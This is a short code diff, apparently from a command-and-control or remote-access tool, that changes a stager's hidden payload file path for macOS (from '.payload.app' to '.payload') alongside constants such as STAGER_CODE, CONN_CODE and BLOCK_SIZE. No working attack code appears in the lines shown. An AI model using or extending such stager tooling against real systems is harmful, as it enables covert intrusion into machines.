@@ -58,7 +58,8 @@ STAGER_CODE = 0
 CONN_CODE = 1
 
 # stager
-PAYLOAD_PATH = 'agent/.bin/.payload.app' if sys.platform == 'darwin' else 'agent/.bin/.payload.exe'
+# PAYLOAD_PATH = 'agent/.bin/.payload.app' if sys.platform == 'darwin' else 'agent/.bin/.payload.exe'
+PAYLOAD_PATH = 'agent/.bin/.payload' if sys.platform == 'darwin' else 'agent/.bin/.payload.exe'
 BLOCK_SIZE = 65535
 
 
